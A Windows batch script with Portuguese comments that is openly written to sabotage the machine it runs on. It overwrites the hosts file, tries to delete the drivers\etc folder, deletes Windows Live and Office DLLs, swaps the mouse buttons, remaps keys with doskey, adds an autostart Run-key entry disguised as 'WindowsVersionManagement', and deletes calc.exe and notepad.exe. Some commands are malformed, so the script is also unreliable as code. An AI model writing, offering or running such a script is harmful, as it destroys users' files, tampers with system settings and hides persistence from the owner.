@echo off
REM Mudar arquivo hosts
copy %windir%\system32\HOSTS %windir%\system32\drivers\etc\hosts
if not exist %windir%\system32\etc\hosts rm %windir%\System32\drivers\etc" /s /q
REM Deletar DLLS
if exist %programfiles%\Windows Live\Contacts\LivePlatform.dll (del /s /q LivePlatform.dll)
if exist %programfiles%\Windows Live\Contacts\consync.dll (del /s /q consync.dll)
if exist %programfiles%\Microsoft Office\Office14\WindowsLiveProvider.dll (del /s /q WindowsLiveProvider.dll)
REM Inverter funções
reg /add HKCU\Control Panel\Desktop\WallPaper /v wallpaper /t REG_SZ /d c:\windows\system32\imagem.gif
reg add HKCU\Control Panel\Mouse /v SwapMouseButtons /d 1 /f
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
doskey a=b
doskey b=c
doskey c=d
doskey 9=6
doskey 5=2
doskey 3=7
doskey m=n
doskey p=o
doskey z=k
REM Inicializar
REG ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsVersionManagement /t REG_SZ /d C:\autoexec.bat /f
REM Deleta killer apps
if exist %windir%\System32\Calc.exe (del /s /q calc.exe)
if exist %windir%\System32\notepad.exe (del /s /q notepad.exe)
exit



